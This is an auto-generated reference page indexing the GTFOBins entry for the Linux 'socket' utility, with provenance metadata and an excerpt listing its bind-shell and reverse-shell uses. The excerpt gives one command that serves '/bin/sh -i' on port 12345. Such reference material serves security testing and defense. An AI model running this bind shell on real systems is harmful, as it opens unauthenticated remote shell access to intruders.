---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# socket

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `socket` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for socket covering bind-shell, reverse-shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/socket.md)
- Source verification: [source record](../../sources/gtfobins/socket.md)

## Aliases

- `socket`

## Source Verification

[source record](../../sources/gtfobins/socket.md)

## Evidence Excerpt

```text
_body: ''
_name: socket
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket
functions:
bind-shell:
- code: socket -svp '/bin/sh -i' 12345
connector: tcp-client
contexts:
```
